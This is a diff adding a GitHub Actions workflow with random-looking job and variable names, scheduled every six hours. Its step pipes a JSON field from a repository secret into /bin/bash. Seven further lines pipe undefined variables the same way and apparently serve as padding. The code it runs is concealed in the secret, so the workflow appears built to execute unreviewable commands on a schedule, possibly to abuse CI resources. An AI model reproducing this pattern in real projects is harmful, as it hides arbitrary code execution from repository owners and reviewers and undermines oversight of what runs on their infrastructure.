@@ -1,0 +1,25 @@
+name: xingbogeng6517
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xingbogeng6517
+        env:
+          xho855: ${{ secrets.xho855 }}
+        run: |
+          echo $xho855 | jq -r .wfphu6 | /bin/bash
+          echo $fwh50 | jq -r .qiu5 | /bin/bash
+          echo $b65320 | jq -r .b8044 | /bin/bash
+          echo $t11 | jq -r .fbnmf3352 | /bin/bash
+          echo $an62345 | jq -r .lpbw96 | /bin/bash
+          echo $gygts61824 | jq -r .rdpn97112 | /bin/bash
+          echo $ovwkd8 | jq -r .dubjz179 | /bin/bash
+          echo $neyoh25 | jq -r .pm1092 | /bin/bash
+
